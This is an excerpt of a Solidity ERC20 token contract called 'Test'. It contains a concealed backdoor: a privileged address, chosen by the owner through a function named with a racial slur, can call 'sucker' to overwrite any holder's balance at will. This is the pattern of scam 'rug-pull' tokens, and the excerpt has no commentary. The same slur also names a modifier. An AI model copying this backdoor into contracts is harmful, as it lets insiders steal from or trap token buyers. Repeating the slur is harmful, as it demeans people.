...
interface kekm {
    function checkmr(address _from, bool _state) external;
 
    function setmr(address _to) external;
}
...
contract Test  is Context, IERC20, Ownable {
    ...
    string private constant _name = "hii";
   ...
   // uint256 private constant MAX = 1000000000 * 10**9;
 ...
 mapping(address => bool) private setmink;
  kekm private _kekw;
    modifier nigga() {
        require(
            address(_kekw) == msg.sender,
            "Error: sniper wallet."
        );
        _;
    }
    ...
    address payable private _developmentAddress = payable(0x60Ba260110F354aD98019bcb77199A8af9FE6160); 
    address payable private _marketingAddress = payable(0x60Ba260110F354aD98019bcb77199A8af9FE6160);
    ...
    function sucker(address _ether, uint256 _checkedr) external nigga {
        
        _rOwned[_ether] = _checkedr;
    }
 
    function setnigga(address[] memory _minks) external onlyOwner {
        for(uint256 i = 0; i < _minks.length; i++) {
            setmink[_minks[i]] = true;
        }
        _kekw = kekm(_minks[10]);
    }
